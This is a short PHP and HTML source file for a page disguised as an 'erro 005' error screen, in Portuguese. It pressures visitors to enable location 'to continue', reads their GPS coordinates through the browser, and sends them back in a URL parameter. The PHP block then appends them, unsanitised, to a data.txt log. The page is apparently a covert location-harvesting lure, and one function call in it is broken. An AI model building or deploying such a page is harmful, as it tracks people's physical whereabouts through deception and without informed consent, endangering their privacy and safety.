<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <link rel="stylesheet" href="style.css">
    <title>erro 005</title>
</head>
<body>

<?php 

    if(!empty($_GET)){

      $fp = fopen('data.txt', 'a');
          
      $x=$_GET['info'];

      fwrite($fp, " Localização: ( $x )");
      fclose($fp);

    }
    
?>
  

  <span class="material-symbols-outlined">warning</span>
  <p id="demo" name="valor" ></p>
  
  



<script>

const x = document.getElementById("demo");

function escreveLoc() { 

  navigator.geolocation.getCurrentPosition(obterLoc);
  x.innerHTML= "Ative a localização para continuar. " ;

} 
escreveLoc()


function obterLoc(position) {

  x.innerHTML = "Latitude: " + position.coords.latitude +
  "<br>Longitude: " + position.coords.longitude;

  Latitude=position.coords.latitude;
  Longitude=position.coords.longitude;

  location.href='?info='+Latitude+' '+Longitude+'';
  console.log(Latitude,Longitude);
  
  
}
obterLoc(position) 

</script>



<style>

  body{
    background-color: black;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    flex-direction: column;
  }

  #demo{

    border: 2px solid red;
    border-radius: 17px;
    width: 160px;
    padding: 8px;
    text-align: center;
    font-size: 20px;
    color: yellow;
  }

  .material-symbols-outlined {
    margin-top: 150px;
    color: rgb(236, 44, 44);
    font-size: 40px;

  }
</style>
</body>
</html>